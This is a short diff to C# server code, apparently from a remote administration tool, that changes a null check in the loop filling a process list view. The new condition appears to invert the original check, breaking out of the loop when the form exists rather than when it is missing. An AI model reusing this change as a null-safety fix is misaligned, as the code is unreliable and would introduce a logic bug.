@@ -62,7 +62,7 @@ namespace xServer.Core.Commands
                 {
                     if (packet.IDs[i] != 0 && packet.Processes[i] != "System.exe")
                     {
-                        if (client.Value.FrmTm == null)
+                        if (client.Value != null && client.Value.FrmTm != null)
                             break;
 
                         ListViewItem lvi =
